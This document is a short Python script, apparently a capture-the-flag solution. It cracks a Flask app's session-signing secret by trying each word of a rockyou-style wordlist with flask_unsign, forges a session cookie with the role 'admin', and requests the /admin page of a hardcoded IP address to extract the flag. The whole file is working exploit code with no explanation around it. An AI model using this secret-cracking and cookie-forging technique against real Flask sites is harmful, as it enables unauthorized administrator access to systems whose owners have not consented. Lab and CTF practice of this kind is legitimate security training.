import requests, re
from flask_unsign import session

def get_words(words_file: str) -> list[str]:
    with open(words_file, "r", errors = "ignore") as f:
        words = f.read().split()
    return words

def get_flag(data: str, prefix: str) -> str:
    return next(iter(re.findall(rf"{prefix}\{{.*?\}}", data)), "")

def get_secret_key(session_cookie: str, words: list[str]) -> str | None:
    for word in words:
        if session.verify(session_cookie, word):
            return word
    return None

def solution(url: str, prefix: str, words_file: str) -> str:
    words = get_words(words_file)
    with requests.Session() as ses:
        ses.get(url)
        secret_key = get_secret_key(ses.cookies.get("session"), words)
        payload = {
            "user": secret_key[::-1],
            "role": "admin"
        }
        ses.cookies.clear()
        ses.cookies.set("session", session.sign(payload, secret_key))
        flag = get_flag(ses.get(url + "admin").text, prefix)
    return flag

if __name__ == "__main__":
    host = "104.198.24.52"
    port = "6011"
    prefix = "flag"
    words_file = "custom_rockyou.txt"
    print(solution(f"http://{host}:{port}/", prefix, words_file))
    